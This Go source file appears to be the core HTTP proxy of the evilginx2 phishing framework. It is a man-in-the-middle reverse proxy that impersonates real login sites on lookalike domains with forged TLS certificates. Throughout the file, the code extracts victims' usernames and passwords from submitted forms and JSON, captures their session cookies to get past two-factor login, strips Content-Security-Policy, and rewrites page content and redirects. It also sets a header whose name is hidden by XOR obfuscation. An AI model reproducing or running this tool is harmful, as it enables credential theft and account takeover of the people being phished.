/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	"github.com/inconshreveable/go-vhost"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	httpReadTimeout  = 15 * time.Second
	httpWriteTimeout = 15 * time.Second
)

type HttpProxy struct {
	Server      *http.Server
	Proxy       *goproxy.ProxyHttpServer
	crt_db      *CertDb
	cfg         *Config
	db          *database.Database
	sniListener net.Listener
	isRunning   bool
	sessions    map[string]*Session
	sids        map[string]int
	cookieName  string
	last_sid    int
	developer   bool
}

type ProxySession struct {
	SessionId   string
	Created     bool
	PhishDomain string
	Index       int
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:     goproxy.NewProxyHttpServer(),
		Server:    nil,
		crt_db:    crt_db,
		cfg:       cfg,
		db:        db,
		isRunning: false,
		last_sid:  0,
		developer: developer,
	}

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	p.cookieName = GenRandomString(4)
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				SessionId:   "",
				Created:     false,
				PhishDomain: "",
				Index:       -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
			}

			//log.Debug("http: %s", req_url)

			parts := strings.SplitN(req.RemoteAddr, ":", 2)
			remote_addr := parts[0]

			phishDomain, phished := p.getPhishDomain(req.Host)
			if phished {
				pl := p.getPhishletByPhishHost(req.Host)
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
				}

				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					sc, err := req.Cookie(p.cookieName)
					if err != nil {
						if !p.cfg.IsSiteHidden(pl_name) {
							uv := req.URL.Query()
							vv := uv.Get(p.cfg.verificationParam)
							if vv == p.cfg.verificationToken {
								session, err := NewSession(pl.Name)
								if err == nil {
									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid

									landing_url := fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									}

									rv := uv.Get(p.cfg.redirectParam)
									if rv != "" {
										url, err := base64.URLEncoding.DecodeString(rv)
										if err == nil {
											session.RedirectURL = string(url)
											log.Debug("redirect URL: %s", url)
										}
									}

									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									req_ok = true
								}
							} else {
								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						var ok bool
						ps.Index, ok = p.sids[sc.Value]
						if ok {
							ps.SessionId = sc.Value
							req_ok = true
						} else {
							log.Warning("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						redirect_url := p.cfg.redirectUrl
						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
						if resp != nil {
							resp.Header.Add("Location", redirect_url)
							return req, resp
						}
					}
				}

				p.deleteRequestCookie(p.cookieName, req)

				// replace "Host" header
				e_host := req.Host
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						contentType := req.Header.Get("Content-type")
						if contentType == "application/json" {
							
							json, _ := ioutil.ReadAll(req.Body)
							log.Debug("POST %s", json)

							re := regexp.MustCompile(pl.re_username)
							um := re.FindStringSubmatch(string(json))
							if um != nil && len(um) > 1 {
								p.setSessionUsername(ps.SessionId, um[1])
								log.Success("[%d] Username: [%s]", ps.Index, um[1])
								if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
									log.Error("database: %v", err)
								}
							}

							re = regexp.MustCompile(pl.re_password)
							pm := re.FindStringSubmatch(string(json))
							if pm != nil && len(pm) > 1 {
								p.setSessionPassword(ps.SessionId, pm[1])
								log.Success("[%d] Password: [%s]", ps.Index, pm[1])
								if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
									log.Error("database: %v", err)
								}
							}

						} else {

							if req.ParseForm() == nil {
								for k, v := range req.Form {
									log.Debug("POST %s = %s", k, v[0])
									if (pl.k_re_username != nil && pl.k_re_username.MatchString(k)) || (pl.k_re_username == nil && k == pl.k_username) {
										if re, err := regexp.Compile(pl.re_username); err == nil {
											um := re.FindStringSubmatch(v[0])
											if um != nil && len(um) > 1 {
												p.setSessionUsername(ps.SessionId, um[1])
												log.Success("[%d] Username: [%s]", ps.Index, um[1])
												if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
									if (pl.k_re_password != nil && pl.k_re_password.MatchString(k)) || (pl.k_re_password == nil && k == pl.k_password) {
										if re, err := regexp.Compile(pl.re_password); err == nil {
											pm := re.FindStringSubmatch(v[0])
											if pm != nil && len(pm) > 1 {
												p.setSessionPassword(ps.SessionId, pm[1])
												log.Success("[%d] Password: [%s]", ps.Index, pm[1])
												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
								}
							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}
				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
				for n, b := range e {
					e[n] = b ^ 0x88
				}
				req.Header.Set(string(e), e_host)

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
								if err != nil {
									log.Error("database: %v", err)
								}
								s.IsDone = true
								if err == nil {
									log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, req.URL.Path)
								}
								break
							}
						}
					}
				}

				if ps.SessionId != "" && origin == "" {
					s, ok := p.sessions[ps.SessionId]
					if ok {
						if s.IsDone && s.RedirectURL != "" {
							log.Important("[%d] redirecting to URL: %s", ps.Index, s.RedirectURL)
							resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
							if resp != nil {
								resp.Header.Add("Location", s.RedirectURL)
								return req, resp
							}
						}
					}
				}
			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					ck = &http.Cookie{
						Name:    p.cookieName,
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  ps.PhishDomain,
						Expires: time.Now().UTC().Add(15 * time.Minute),
						MaxAge:  15 * 60,
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" {
				resp.Header.Set("Access-Control-Allow-Origin", "*")
			}
			resp.Header.Del("Content-Security-Policy")

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					resp.Header.Set("Location", r_url.String())
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(resp.Request.Host)
			var auth_tokens map[string][]*AuthToken
			if pl != nil {
				auth_tokens = pl.authTokens
			}
			is_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie
				if pl != nil && ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = resp.Request.Host
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					if pl.isAuthToken(c_domain, ck.Name) {
						s, ok := p.sessions[ps.SessionId]
						if ok && !s.IsDone {
							if ck.Value != "" { // cookies with empty values are of no interest to us
								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
								if len(pl.authUrls) > 0 {
									is_auth = false
								}
								if is_auth {
									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
										log.Error("database: %v", err)
									}
									s.IsDone = true
								}
							}
						}
					}
				}

				ck.Secure = false
				ck.MaxAge = 0
				if time.Now().Before(ck.Expires) {
					ck.Expires, _ = time.Parse("1600-01-01", "1600-01-01")
				}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if is_auth {
				// we have all auth tokens
				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
			}

			// modify received body
			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			for site, pl := range p.cfg.phishlets {
				if p.cfg.IsSiteEnabled(site) {
					sfs, ok := pl.subfilters[resp.Request.Host]
					if ok {
						for _, sf := range sfs {
							if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) {
								re_s := sf.regexp
								replace_s := sf.replace
								phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
								phish_sub, _ := p.getPhishSub(phish_hostname)

								re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
								re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
								re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
								replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
								replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
								replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
								replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
								phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
								if ok {
									replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
									replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
								}

								body, err := ioutil.ReadAll(resp.Body)
								if err == nil {
									if re, err := regexp.Compile(re_s); err == nil {
										body := re.ReplaceAllString(string(body), replace_s)
										resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}
					}
				}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		if !p.developer {
			pl := p.getPhishletByOrigHost(hostname)
			if pl != nil {
				phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
				if ok {
					cert, err := p.crt_db.GetCertificate(pl.Name, phishDomain)
					if err != nil {
						return nil, err
					}
					return &tls.Config{
						InsecureSkipVerify: true,
						Certificates:       []tls.Certificate{*cert},
					}, nil
				}
			}
			return nil, fmt.Errorf("no SSL/TLS certificate for host '%s'", host)
		} else {
			phish_host, ok := p.replaceHostWithPhished(hostname)
			if !ok {
				return nil, fmt.Errorf("phishing hostname not found")
			}
			cert, err := p.crt_db.SignCertificateForHost(hostname, phish_host, port)
			if err != nil {
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
	}
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			tlsConn, err := vhost.TLS(c)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()
			if hostname == "" {
				return
			}

			if !p.cfg.IsActiveHostname(hostname) {
				log.Debug("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					if ph.handle_session {
						return true
					}
					return false
				}
			}
		}
	}
	return false
}

func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
	if cookie := req.Header.Get("Cookie"); cookie != "" {
		re := regexp.MustCompile(`(` + name + `=[^;]*;?\s*)`)
		new_cookie := re.ReplaceAllString(cookie, "")
		req.Header.Set("Cookie", new_cookie)
	}
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func orPanic(err error) {
	if err != nil {
		panic(err)
	}
}
